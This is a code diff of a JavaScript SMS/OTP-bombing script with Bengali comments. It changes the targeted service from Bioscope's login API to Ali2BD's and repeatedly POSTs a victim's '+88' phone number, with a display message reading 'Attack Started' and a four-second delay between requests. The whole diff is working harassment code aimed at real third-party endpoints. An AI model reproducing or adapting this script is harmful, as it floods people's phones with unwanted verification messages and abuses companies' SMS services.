@@ -33,26 +33,26 @@ async function startProcess() {
         return;
     }
 
-    display.innerText = "Bioscope Attack Started..."; 
+    display.innerText = "Ali2BD Attack Started...";
     
     for (let i = 1; i <= count; i++) {
         try { 
-            // শুধুমাত্র আপনার খুঁজে পাওয়া Bioscope POST API
-            await fetch('https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en', { 
+            // আপনার নিজের খুঁজে বের করা Ali2BD POST API
+            await fetch('https://ali2bd-api.service.moveo.global/api/consumer/v1/auth/login', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ 
-                    "number": "+88" + target // আপনার পেলোড অনুযায়ী +88 লাগবে
-                }), 
+                body: JSON.stringify({
+                    "username": "+88" + target // Ali2BD এ নম্বর +88 সহ দিতে হয়
+                }),
                 mode: 'cors'
-            }); 
+            });
 
-            display.innerText = "Sent: " + i; 
+            display.innerText = "Sent: " + i;
             
-            // আপনার সেই ৪ সেকেন্ডের বিরতি
-            await new Promise(res => setTimeout(res, 4000)); 
+            // নিরাপদ ৪ সেকেন্ডের বিরতি
+            await new Promise(res => setTimeout(res, 4000));
         } catch (e) {
             console.log("Error skipped...");
         }
